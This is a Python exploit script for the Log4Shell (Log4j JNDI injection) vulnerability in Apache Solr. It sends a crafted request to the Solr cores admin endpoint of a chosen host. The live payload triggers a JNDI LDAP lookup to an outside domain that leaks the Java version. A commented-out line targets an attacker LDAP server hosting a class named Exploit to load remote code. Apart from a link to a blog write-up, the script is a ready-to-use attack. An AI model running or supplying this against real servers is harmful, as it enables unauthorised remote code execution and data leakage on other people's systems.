import argparse
import requests

# Set up argument parsing
parser = argparse.ArgumentParser(description="Attempt to access sensitive files via various plugins.")
parser.add_argument('--host', type=str, default='localhost', help='Target host (default: localhost)')
parser.add_argument('--port', type=str, default='8983', help='Target port (default: 8983)')

args = parser.parse_args()

# Use arguments from CLI or default values
host = args.host
port = args.port

print(host, port)

# Define the URL and headers
url = f'http://{host}:{port}/solr/admin/cores?action=$' + "{jndi:ldap://${sys:java.version}.example.com}"
# url = "http://localhost:8983/solr/admin/cores?action=${jndi:ldap://172.17.0.1:1389/#Exploit/}"
# https://www.manrajbansal.com/post/exploiting-log4j-apache-solr

headers = {
    "Accept-Encoding": "gzip, deflate",
    "Accept": "*/*",
    "Accept-Language": "en",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36",
    "Connection": "close"
}

# Make the GET request
response = requests.get(url, headers=headers)

# Print the response status and content
print("Status Code:", response.status_code)
print("Response Body:", response.text)

